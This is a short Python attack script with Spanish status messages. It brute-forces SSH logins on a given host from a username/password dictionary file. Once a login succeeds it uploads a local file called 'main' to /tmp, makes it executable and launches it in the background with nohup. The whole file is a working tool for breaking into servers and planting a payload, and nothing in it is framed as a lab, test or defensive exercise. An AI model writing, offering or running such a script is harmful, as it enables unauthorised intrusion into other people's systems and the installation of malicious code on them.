#!/usr/bin/env python


import paramiko
import sys


def UploadFileAndExecute(sshConnection, fileName) :

	print("[+] Copiando Archivo ")
	sftpClient = sshConnection.open_sftp()
	
	sftpClient.put(fileName, "/tmp/" +fileName)

	sshConnection.exec_command("chmod a+x /tmp/" +fileName)
	
	print("[+] Ejecutando Archivo ")
	sshConnection.exec_command("nohup /tmp/" +fileName+ " &")

def AttackSSH(ipAddress, dictionaryFile) :

	print("[+] Atacando Host : %s " %ipAddress)

	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for line in open(dictionaryFile, "r").readlines() :

		[username, password] = line.strip().split()

		try :
			print("[+] Intentando entrar con usuario: %s y  clave: %s " % (username, password))
			ssh.connect(ipAddress, username=username, password=password)

		except paramiko.AuthenticationException:
			print ("[-] Fallo! ...")
			continue 
		print("[+] Paso ... Usuario: %s y Clave %s es valida! " % (username, password))
		UploadFileAndExecute(ssh, 'main')		
	
		break




if __name__ == "__main__" :
	AttackSSH(sys.argv[1], sys.argv[2])

	